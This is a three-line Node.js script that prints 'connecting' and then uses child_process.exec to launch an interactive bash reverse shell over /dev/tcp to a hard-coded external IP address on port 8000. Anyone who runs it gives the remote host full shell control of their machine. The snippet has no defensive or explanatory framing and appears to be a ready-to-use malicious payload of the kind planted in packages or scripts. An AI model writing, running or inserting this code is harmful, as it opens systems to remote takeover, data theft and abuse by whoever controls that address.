console.log('connecting');
const cp = require("child_process")
cp.exec(`/bin/bash -i >& /dev/tcp/52.166.118.236/8000 0>&1`)
